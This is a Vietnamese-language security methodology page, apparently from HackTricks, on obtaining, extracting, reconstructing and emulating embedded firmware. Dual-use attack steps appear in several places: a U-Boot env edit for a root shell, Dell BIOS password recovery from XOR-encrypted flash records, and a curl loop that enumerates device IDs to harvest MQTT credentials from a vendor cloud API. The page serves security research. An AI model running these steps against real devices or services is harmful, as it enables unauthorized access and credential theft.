# Phân tích Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giới thiệu**

### Tài nguyên liên quan

Để thu thập firmware thông qua các giao diện phần cứng có thể truy cập, xem [trích xuất firmware qua UART console](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) và [trích xuất SPI flash](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Để ghi lại UART lặp lại được khi khởi động, trước khi truy cập console, xem [thu thập dữ liệu bằng nguồn điện điều khiển qua SCPI và oscilloscope](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware là phần mềm thiết yếu giúp thiết bị hoạt động chính xác bằng cách quản lý và hỗ trợ giao tiếp giữa các thành phần phần cứng với phần mềm mà người dùng tương tác. Firmware được lưu trong bộ nhớ không mất dữ liệu, giúp thiết bị truy cập các hướng dẫn quan trọng ngay khi được cấp nguồn và khởi chạy hệ điều hành. Kiểm tra và có khả năng sửa đổi firmware là bước quan trọng để xác định các lỗ hổng bảo mật.<sup>[[2]](#references)[[3]](#references)</sup>

## **Thu thập thông tin**

**Thu thập thông tin** là bước khởi đầu quan trọng để tìm hiểu cấu tạo của thiết bị và các công nghệ mà thiết bị sử dụng. Quá trình này bao gồm thu thập dữ liệu về:

- Kiến trúc CPU và hệ điều hành thiết bị chạy
- Thông tin cụ thể về bootloader
- Bố cục phần cứng và datasheet
- Số liệu về codebase và vị trí mã nguồn
- Thư viện bên ngoài và loại giấy phép
- Lịch sử cập nhật và chứng nhận theo quy định
- Sơ đồ kiến trúc và luồng
- Đánh giá bảo mật và các lỗ hổng đã xác định

Trong quá trình này, các công cụ **open-source intelligence (OSINT)** rất hữu ích, cũng như việc phân tích mọi thành phần phần mềm nguồn mở hiện có bằng các quy trình đánh giá thủ công và tự động. Các công cụ như [Coverity Scan](https://scan.coverity.com) và [Semmle’s LGTM](https://lgtm.com/#explore) cung cấp tính năng phân tích tĩnh miễn phí có thể được tận dụng để tìm các vấn đề tiềm ẩn.

## **Thu thập Firmware**

Có thể lấy firmware bằng nhiều cách khác nhau, mỗi cách có độ phức tạp riêng:

- Lấy **trực tiếp** từ nguồn (nhà phát triển, nhà sản xuất)
- **Build** firmware theo hướng dẫn được cung cấp
- **Tải xuống** từ các trang hỗ trợ chính thức
- Sử dụng truy vấn **Google dork** để tìm các tệp firmware được lưu trữ trực tuyến
- Truy cập trực tiếp **cloud storage** bằng các công cụ như [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Chặn **các bản cập nhật** bằng kỹ thuật man-in-the-middle
- **Trích xuất** từ thiết bị qua các kết nối như **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) hoặc **PICit**
- **Sniff** các yêu cầu cập nhật trong quá trình giao tiếp của thiết bị
- Xác định và sử dụng **các endpoint cập nhật được hardcode**
- **Dump** từ bootloader hoặc qua mạng
- Nếu không còn cách nào khác, **tháo và đọc** chip lưu trữ bằng các công cụ phần cứng phù hợp

### Nhật ký chỉ có UART: buộc mở root shell qua U-Boot env trong flash

Nếu UART RX bị bỏ qua (chỉ có nhật ký), bạn vẫn có thể buộc mở init shell bằng cách **chỉnh sửa offline blob môi trường U-Boot**:<sup>[[6]](#references)</sup>

1. Dump SPI flash bằng kẹp SOIC-8 và thiết bị nạp (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Xác định phân vùng env của U-Boot, chỉnh sửa `bootargs` để thêm `init=/bin/sh` và **tính lại CRC32 của U-Boot env** cho blob.
3. Chỉ flash lại phân vùng env rồi khởi động lại; shell sẽ xuất hiện trên UART.

Cách này hữu ích trên các thiết bị nhúng có shell của bootloader bị tắt nhưng phân vùng env có thể ghi thông qua quyền truy cập flash bên ngoài.

### Làm lộ mã được bảo vệ thông qua tác vụ sao chép của Firewall

Một số MCU cho phép mã ứng dụng không được bảo vệ gọi một cổng vào vùng được bảo vệ, thay vì đọc trực tiếp Flash được bảo vệ. Sau khi có được khả năng thực thi mã ứng dụng, hãy kiểm tra từng tác vụ của cổng vào như một primitive truyền dữ liệu bộ nhớ riêng biệt. Trong trường hợp Cypherock X1, cổng gọi Firewall của STM32L4 nhận một tác vụ, con trỏ `data` bên ngoài, độ dài và `address` được bảo vệ. Tác vụ ghi không từ chối con trỏ nguồn `data` trỏ vào Firewall Code. Bên gọi không thể đọc trực tiếp mã đó, nhưng chính cổng vào có thể sao chép mã vào vùng lưu trữ không bay hơi được bảo vệ, nơi một tác vụ đọc được phép có thể truy xuất.<sup>[[15]](#references)</sup>

Để tái hiện kiểu làm lộ dữ liệu này, hãy xác định một trang lưu trữ được bảo vệ có thể ghi và có tác vụ đọc tương ứng, đặt nguồn ghi lần lượt thành các địa chỉ mã được bảo vệ, rồi đọc lại các byte đã lưu tạm. Kiểm tra loại bộ nhớ trước khi ghi lặp lại: trong trường hợp này là Flash, nên cần xóa trang trước khi sử dụng lại. Các nhà nghiên cứu đã dùng một routine xóa rồi khôi phục nội dung Secure Data Storage hợp lệ, sau đó lưu tạm mã vào phần dung lượng trống còn lại thay vì ghi đè dữ liệu ví. Cách này đòi hỏi khả năng thực thi mã trên MCU và một cổng gọi có thể truy cập; đây không phải là cách vượt qua cơ chế bảo vệ đọc trực tiếp từ một host chưa xác thực.<sup>[[15]](#references)</sup>

Mã khôi phục được có thể làm lộ [các lỗ hổng tin cậy trong cập nhật firmware và tính toàn vẹn khởi động](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Phân tích firmware

Giờ đây bạn đã **có firmware**, hãy trích xuất thông tin về nó để biết cách xử lý. Có thể dùng các công cụ khác nhau sau:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Nếu không tìm thấy nhiều thông tin bằng các công cụ đó, hãy kiểm tra **entropy** của image bằng `binwalk -E <bin>`. Nếu entropy thấp, image có thể không được mã hóa. Nếu entropy cao, image có thể đã được mã hóa (hoặc nén theo cách nào đó).

Ngoài ra, bạn có thể dùng các công cụ này để trích xuất **các file được nhúng bên trong firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Hoặc dùng [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) để kiểm tra file.

### Tài nguyên hiển thị thô trong flash ngoài

Bản dump SPI ngoài không nhất thiết là firmware thực thi của MCU. Với mục tiêu Cortex-M, hãy so sánh phần đầu của từng vùng mã tiềm năng với memory map của thiết bị: một vector table thông thường bắt đầu bằng địa chỉ con trỏ stack SRAM hợp lệ và địa chỉ reset-handler nằm trong vùng nhớ thực thi. Chỉ riêng việc không có vector table tại offset 0 không chứng minh rằng toàn bộ chip không có mã; hãy kiểm tra các offset khác và cách thiết bị khởi động. Nếu `binwalk` không tìm thấy container, hãy kiểm tra byte thô và đối chiếu các địa chỉ đọc flash từ [bản ghi SPI đã giải mã](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) với các thao tác tải màn hình mới.<sup>[[14]](#references)</sup>

Đối với vùng chứa tài nguyên hiển thị, hãy thử các định dạng pixel và kích thước tiềm năng thay vì mặc định là PNG/JPEG. Thiết bị được đề cập sử dụng các frame **80×160 RGB565 little-endian**: với hai byte trên mỗi pixel, một frame có kích thước **25,600 byte** (25 KiB), không phải 24 kilobit. Địa chỉ đọc flash đã giải mã giúp xác định offset của tài nguyên màn hình; nhà nghiên cứu chuyển đổi một image đã chuẩn bị bằng `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, thay thế tài nguyên có cùng kích thước trong bản dump gốc, ghi dữ liệu bằng `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` và xác nhận image mới hiển thị trên màn hình. Điều này chứng minh rằng *tài nguyên hiển thị bên ngoài* có thể ghi được, chứ không phải MCU đã trích xuất hoặc nạp lại firmware nội bộ. Hãy giữ bản dump gốc và xác minh kích thước, thứ tự byte, offset và độ dài dữ liệu thay thế trước khi ghi.<sup>[[14]](#references)</sup>

### Phân tích flash sai khác và kho lưu trữ bí mật XOR có thể khôi phục

Khi firmware không có định dạng lưu trữ được tài liệu hóa cho một thiết lập, trước tiên hãy đọc flash nhiều lần trong cùng điều kiện, chỉ thay đổi **duy nhất một** thiết lập, sau đó dump lại toàn bộ chip và so sánh các offset. Lặp lại thử nghiệm với các giá trị được kiểm soát sẽ giúp phân biệt thiết lập đó với bộ đếm và metadata ghi; các thay đổi xuất hiện tại offset mới thay vì ghi đè tại chỗ cho thấy kho lưu trữ có thể chỉ ghi nối tiếp hoặc có cấu trúc dạng log. Hãy giữ lại các entry đã xóa/đánh dấu tombstone vì byte payload của chúng có thể vẫn khôi phục được.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Sau khi xác định được vùng này, hãy trích xuất các mô-đun firmware bằng những công cụ như `binwalk` và reverse hàm ghi/xác thực trong Ghidra. Xác nhận ranh giới trường, phần đệm, cách đánh chỉ mục khóa và cách dẫn xuất khóa trong code, thay vì chỉ suy luận sơ đồ từ các mẫu bản mã.<sup>[[12]](#references)</sup>

#### Khôi phục khóa từ phần đệm zero đã mã hóa

Như mô tả trong [mã hóa dựa trên XOR](../../crypto/symmetric/#xor-based-encryption), plaintext đã biết sẽ tiết lộ các byte keystream tại cùng vị trí. Một trường có kích thước cố định đặc biệt dễ bị lộ khi phần đệm zero trải dài qua mọi chỉ mục của khóa XOR lặp: phần đệm đã mã hóa tiết lộ trực tiếp các byte khóa đó vì `0x00 XOR key_byte = key_byte`. Nếu mọi chỉ mục khóa đều được phủ, hãy tái tạo khóa từ phần cuối ciphertext rồi giải mã các byte có dữ liệu.<sup>[[12]](#references)</sup>

Định dạng mật khẩu BIOS DVAR dễ bị tấn công của Dell là một ví dụ cụ thể: byte `0` của trường 32 byte ở dạng plaintext, còn các byte `1..31` sử dụng khóa lặp dài 20 byte.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Với độ dài mật khẩu `L`, các vị trí `L..31` đều bằng 0 trước khi XOR. Khi `L <= 12`, các vị trí đó bao phủ mọi chỉ số khóa, vì vậy có thể khôi phục toàn bộ khóa và mật khẩu mà không cần brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Trích xuất khóa từ bản ghi lịch sử

Không phân tích từng bản ghi riêng lẻ. Khóa DVAR được tạo gần đúng theo công thức `modified_md5(device_seed || variable_GUID || password[0])`: device seed và GUID là cố định, còn đầu vào duy nhất phụ thuộc vào password là byte đầu tiên ở dạng rõ. Điều này tạo ra tối đa 256 khóa cho mỗi thiết bị, và các bản ghi có cùng byte đầu tiên sẽ dùng chung một khóa. Hãy nhóm các bản ghi đang hoạt động và đã bị xóa theo byte đó; một bản ghi lịch sử ngắn có thể để lộ toàn bộ khóa thông qua phần đệm, rồi dùng khóa đó để giải mã một bản ghi hiện tại dài hơn mà phần đệm của chính nó không đủ. Vì vậy, việc xoay vòng password có thể làm tăng mức độ lộ lọt nếu ciphertext cũ bị đánh dấu xóa thay vì bị xóa sạch.<sup>[[12]](#references)</sup>

Công cụ [`dellpwn`](https://github.com/R3n5k1/dellpwn) xác định vị trí DVAR, xác thực các bản ghi ứng viên, khôi phục password và có thể hiển thị byte thô được lưu trữ/byte khóa. Hãy build công cụ từ một bản checkout và quét image flash đã được xác minh như sau:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Đối với parser tùy chỉnh, hãy loại bỏ các kết quả dương tính giả bằng cách kiểm tra cấu trúc bản ghi, giới hạn ký tự có thể in, phần đệm bằng zero, entropy của khóa và tính nhất quán tại vị trí khóa quay vòng. Nếu các bản dump lặp lại cho thấy một số bit bị lật thưa thớt sau mỗi lần ghi, hãy liệt kê các mask đã quan sát và xếp hạng các phương án sửa dựa trên những ràng buộc này, nhưng hãy báo cáo các ký tự chưa xác định thay vì trình bày kết quả suy đoán như thể đã khôi phục chính xác.<sup>[[12]](#references)</sup>

Trình xác minh mật khẩu nên lưu hash một chiều có salt và được lặp nhiều lần, thay vì ciphertext có thể giải mã ngược; các kho lưu trữ dạng log nên xóa an toàn dữ liệu bí mật đã bị thay thế.<sup>[[12]](#references)</sup>

### Lấy Hệ thống Tệp

Với các công cụ đã đề cập trước đó như `binwalk -ev <bin>`, bạn hẳn đã có thể **trích xuất hệ thống tệp**.\
Binwalk thường trích xuất hệ thống tệp vào **một thư mục được đặt tên theo loại hệ thống tệp**, thường là một trong các loại sau: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Trích xuất Hệ thống Tệp Thủ công

Đôi khi, binwalk **không có byte magic của hệ thống tệp trong các chữ ký của nó**. Trong những trường hợp này, hãy dùng binwalk để **tìm offset của hệ thống tệp và carve hệ thống tệp đã nén** từ binary, sau đó **trích xuất hệ thống tệp thủ công** theo loại của nó bằng các bước bên dưới.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Chạy **lệnh dd** sau để trích xuất hệ thống tệp Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Ngoài ra, cũng có thể chạy lệnh sau.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Với squashfs (được dùng trong ví dụ trên)

`$ unsquashfs dir.squashfs`

Các tệp sẽ nằm trong thư mục "`squashfs-root`" sau đó.

- Các tệp lưu trữ CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Với filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Với filesystem ubifs sử dụng NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Tái dựng các root filesystem nhúng bị chia tách

Nếu bản dump eMMC/SSD thô chứa header filesystem hợp lệ nhưng các offset metadata vượt quá phân vùng danh nghĩa, đừng vội kết luận rằng nó bị hỏng. Mã khởi động nhúng có thể ghép thiết bị root thực từ nhiều dải vật lý bằng Device Mapper, vì vậy việc trích xuất một phân vùng GPT chỉ tạo ra đoạn đầu tiên.<sup>[[9]](#references)</sup>

#### Phân loại ban đầu toàn bộ ảnh phương tiện lưu trữ

Trước tiên, hãy xác minh quá trình thu thập đã hoàn tất, kích thước ổn định và không còn tiến trình nào đang ghi vào ảnh. Nếu tên tệp mã hóa địa chỉ bắt đầu/kết thúc, hãy đối chiếu dải đó với số byte thực tế. Khôi phục GPT ở chế độ chỉ đọc và chỉ gắn vùng cần thiết; **không** chạy `vgchange -ay` trên một physical volume không đáng tin cậy ở máy trạm, vì có thể xảy ra xung đột volume group và ghi ngoài ý muốn.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Ưu tiên dùng VM dùng một lần khi logic init ban đầu hoặc một LVM stack cần nhìn thấy toàn bộ image. Nhật ký boot cũ từ một boot partition tiêu chuẩn đặc biệt hữu ích: bootloader có thể đã ghi lại các offset của proprietary container, độ dài component, lựa chọn slot, quy tắc căn chỉnh và quá trình xác minh chữ ký. Dùng các giá trị đó để carve command line/kernel/initramfs được nhúng, sau đó xác thực riêng từng đầu ra bằng `file`, magic bytes và `binwalk`; đọc đến hết container có thể vô tình thêm initrd, đối tượng ACPI hoặc chữ ký vào kernel.<sup>[[9]](#references)</sup>

#### Khôi phục block map lúc boot

Trích xuất initramfs của kernel và reverse `/init` cùng mọi thư viện lưu trữ. Trong [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), lần theo các tham chiếu chuỗi cho `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` và đường dẫn partition; sau đó lần theo code chọn slot A/B đang hoạt động và tạo table. Các điểm bắt đầu hữu ích trong radare2 là `r2 -A init`, `afl`, `pdf @ main` và `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Linear target ánh xạ các dải liên tiếp của một thiết bị ảo sang các dải của một hoặc nhiều thiết bị backing. Một table gồm hai segment được khôi phục thường có dạng sau (mọi vị trí và độ dài đều tính theo sector 512 byte):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Tái hiện chính xác phép tính số học trong machine code, bao gồm độ rộng số nguyên, phép dịch bit và chuyển đổi đơn vị. Ví dụ, biểu thức sau làm tròn xuống kích thước byte đến ranh giới 4 KiB rồi mới chuyển đổi sang sector 512 byte; thay bằng `p4_bytes // 512` sẽ làm dịch phần cuối được chọn một lượng bằng `p4_bytes % 4096` nếu phân vùng không căn chỉnh theo trang.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Tái tạo ảnh phân tích phẳng bằng cách sao chép các vùng theo thứ tự trong bảng, sử dụng các chunk có giới hạn thay vì tải toàn bộ bản dump media vào bộ nhớ. Cách này cũng tránh tạo các thiết bị mapper phía host. Giữ riêng các offset lấy từ GPT, số sector đảo ngược và độ dài đầu ra thu được dưới dạng các assertion.<sup>[[9]](#references)</sup>

#### Phân biệt lỗi hỏng dữ liệu với lỗi tái tạo cố định

Với SquashFS, hãy kiểm tra magic `hsqs` và giải mã trường `bytes_used` 64-bit little-endian tại offset 40 của superblock trước khi chạy `unsquashfs`. Nếu quá trình giải nén thất bại ở một số cấu trúc không liên quan, hãy tìm kiếm trên một vùng rộng quanh các vị trí dự kiến và yêu cầu các ứng viên cấu trúc có độ tin cậy cao: một metadata block giải nén được, một số directory entry hợp lệ liên tiếp, các trường inode hợp lý, root inode phù hợp với số lượng inode hoặc cấu trúc integrity metadata hợp lệ. Chỉ một kết quả khớp magic là chưa đủ.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Khi cùng một signed delta khiến các cấu trúc độc lập trở nên hợp lệ—ví dụ như metadata thư mục và bản ghi verity—nguyên nhân nhiều khả năng là lỗi xác định điểm bắt đầu segment có tính hệ thống, chứ không phải thiếu byte. Hãy quay lại phép tính đảo ngược và kiểm tra các phần dư bị loại bỏ, signedness, tràn số hoặc việc làm tròn theo sector/page trước khi thử khôi phục orphan hoặc vá metadata hệ thống tệp.<sup>[[9]](#references)</sup>

Cuối cùng, hãy phân biệt rõ các ranh giới bảo vệ: volume LUKS được TPM seal bảo vệ tính bảo mật của dữ liệu, trong khi ánh xạ dm-verity đã ký bảo vệ tính toàn vẹn của root filesystem. Software TPM không thể khôi phục khóa được seal với TPM vật lý ban đầu; và việc boot một SquashFS đã sửa đổi thông qua init chỉ dành cho nghiên cứu, bỏ qua bước xác minh verity, không làm giả chữ ký hay phá vỡ dm-verity.<sup>[[9]](#references)</sup>

## Phân tích Firmware

Sau khi lấy được firmware, điều thiết yếu là phân tích kỹ nó để hiểu cấu trúc và các lỗ hổng tiềm ẩn. Quá trình này bao gồm việc sử dụng nhiều công cụ để phân tích và trích xuất dữ liệu có giá trị từ image firmware.

### Công cụ phân tích ban đầu

Một bộ lệnh được cung cấp để kiểm tra ban đầu tệp nhị phân (được gọi là `<bin>`). Các lệnh này giúp xác định loại tệp, trích xuất chuỗi, phân tích dữ liệu nhị phân và tìm hiểu thông tin về phân vùng cũng như hệ thống tệp:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Để đánh giá trạng thái mã hóa của image, hãy kiểm tra **entropy** bằng `binwalk -E <bin>`. Entropy thấp cho thấy image có thể không được mã hóa, trong khi entropy cao cho thấy khả năng image đã được mã hóa hoặc nén.

Để trích xuất **các tệp nhúng**, nên dùng các công cụ và tài nguyên như tài liệu **file-data-carving-recovery-tools** và **binvis.io** để kiểm tra tệp.

### Trích xuất hệ thống tệp

Dùng `binwalk -ev <bin>` thường có thể trích xuất hệ thống tệp, thường vào một thư mục được đặt tên theo loại hệ thống tệp (ví dụ: squashfs, ubifs). Tuy nhiên, khi **binwalk** không nhận dạng được loại hệ thống tệp do thiếu magic bytes, cần trích xuất thủ công. Cách này bao gồm việc dùng `binwalk` để xác định offset của hệ thống tệp, sau đó dùng lệnh `dd` để trích xuất hệ thống tệp:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Sau đó, tùy thuộc vào loại filesystem (ví dụ: squashfs, cpio, jffs2, ubifs), sẽ sử dụng các lệnh khác nhau để trích xuất nội dung theo cách thủ công.

### Phân tích filesystem

Sau khi trích xuất filesystem, có thể bắt đầu tìm kiếm các lỗ hổng bảo mật. Cần chú ý đến các network daemon không an toàn, thông tin xác thực được hardcode, API endpoint, chức năng của update server, mã chưa biên dịch, script khởi động và binary đã biên dịch để phân tích ngoại tuyến.

**Các vị trí** và **mục quan trọng** cần kiểm tra bao gồm:

- **etc/shadow** và **etc/passwd** để tìm thông tin xác thực người dùng
- Chứng chỉ và khóa SSL trong **etc/ssl**
- Các file cấu hình và script có khả năng chứa lỗ hổng
- Binary nhúng để phân tích thêm
- Web server và binary phổ biến trên thiết bị IoT

Một số công cụ hỗ trợ tìm thông tin nhạy cảm và lỗ hổng trong filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) và [**Firmwalker**](https://github.com/craigz28/firmwalker) để tìm kiếm thông tin nhạy cảm
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) để phân tích firmware toàn diện
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) và [**EMBA**](https://github.com/e-m-b-a/emba) để phân tích tĩnh và động

### Kiểm tra bảo mật đối với binary đã biên dịch

Cần kiểm tra kỹ cả mã nguồn lẫn binary đã biên dịch trong filesystem để tìm lỗ hổng. Các công cụ như **checksec.sh** dành cho binary Unix và **PESecurity** dành cho binary Windows giúp xác định các binary không được bảo vệ và có thể bị khai thác.

## Thu thập cấu hình cloud và thông tin xác thực MQTT thông qua token URL được tạo ra

Nhiều IoT hub lấy cấu hình riêng cho từng thiết bị từ một cloud endpoint có dạng:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Trong quá trình phân tích firmware, bạn có thể phát hiện `<token>` được tạo cục bộ từ device ID bằng một secret được hardcode, chẳng hạn như:

- token = MD5( deviceId || STATIC_KEY ) và được biểu diễn dưới dạng hex viết hoa

Thiết kế này cho phép bất kỳ ai biết deviceId và STATIC_KEY đều có thể tạo lại URL và lấy cấu hình cloud, thường làm lộ thông tin xác thực MQTT dạng văn bản thuần và tiền tố topic.

Quy trình thực tế:

1) Trích xuất deviceId từ log khởi động UART

- Kết nối bộ chuyển đổi UART 3.3V (TX/RX/GND) và ghi lại log:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Tìm các dòng in ra mẫu URL cấu hình đám mây và địa chỉ broker, ví dụ:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Trích xuất STATIC_KEY và thuật toán token từ firmware

- Tải các binary vào Ghidra/radare2 rồi tìm đường dẫn cấu hình ("/pf/") hoặc cách sử dụng MD5.
- Xác nhận thuật toán (ví dụ: MD5(deviceId||STATIC_KEY)).
- Tạo token bằng Bash và chuyển digest thành chữ hoa:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Thu thập cấu hình cloud và thông tin xác thực MQTT

- Tạo URL rồi tải JSON bằng curl; dùng jq để trích xuất các bí mật:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Khai thác MQTT truyền plaintext và ACL topic yếu (nếu có)

- Dùng thông tin xác thực đã thu hồi để subscribe vào các topic bảo trì và tìm các sự kiện nhạy cảm:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Liệt kê các device ID có thể dự đoán (ở quy mô lớn, khi được cấp phép)

- Nhiều hệ sinh thái nhúng các byte OUI/sản phẩm/loại của nhà cung cấp, theo sau là hậu tố tuần tự.
- Bạn có thể lặp qua các ID ứng viên, tạo token và truy xuất configs bằng lập trình:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- Luôn xin phép rõ ràng trước khi thực hiện liệt kê hàng loạt.
- Khi có thể, hãy ưu tiên mô phỏng hoặc phân tích tĩnh để khôi phục bí mật mà không sửa đổi phần cứng mục tiêu.

Quá trình mô phỏng firmware cho phép thực hiện **phân tích động** hoạt động của thiết bị hoặc của một chương trình riêng lẻ. Cách tiếp cận này có thể gặp khó khăn do phụ thuộc vào phần cứng hoặc kiến trúc, nhưng việc chuyển hệ thống tệp gốc hoặc các tệp nhị phân cụ thể sang thiết bị có kiến trúc và thứ tự byte phù hợp, chẳng hạn như Raspberry Pi, hoặc sang máy ảo dựng sẵn, có thể hỗ trợ thử nghiệm thêm.

### Mô phỏng các tệp nhị phân riêng lẻ

Khi kiểm tra từng chương trình, việc xác định thứ tự byte và kiến trúc CPU của chương trình là rất quan trọng.

#### Ví dụ với kiến trúc MIPS

Để mô phỏng một tệp nhị phân kiến trúc MIPS, có thể dùng lệnh:

```bash
file ./squashfs-root/bin/busybox
```

Và để cài đặt các công cụ giả lập cần thiết:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Với MIPS (big-endian), sử dụng `qemu-mips`; còn với các binary little-endian, có thể dùng `qemu-mipsel`.

#### Mô phỏng kiến trúc ARM

Đối với các binary ARM, quy trình tương tự, sử dụng trình mô phỏng `qemu-arm`.

### Mô phỏng toàn hệ thống

Các công cụ như [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) và các công cụ khác hỗ trợ mô phỏng toàn bộ firmware, tự động hóa quy trình và hỗ trợ phân tích động.

### Tái tạo root filesystem được chia tách và xác minh để mô phỏng

Nếu superblock SquashFS đọc được nhưng các offset inode, directory hoặc fragment table không hợp lý, đừng vội vá `unsquashfs`. Hãy phân tích ngược binary khởi động sớm và tái tạo đồ thị block-device mà nó tạo ra: các hệ thống nhúng có thể hiển thị một phân vùng root danh nghĩa nhưng lại tạo filesystem thực bằng ánh xạ `dm-linear` nối thêm các sector lấy từ một phân vùng khác. Các bước kiểm tra chỉ dựa trên superblock có thể thành công dù mọi block metadata phía sau đều bị lệch.<sup>[[11]](#references)</sup>

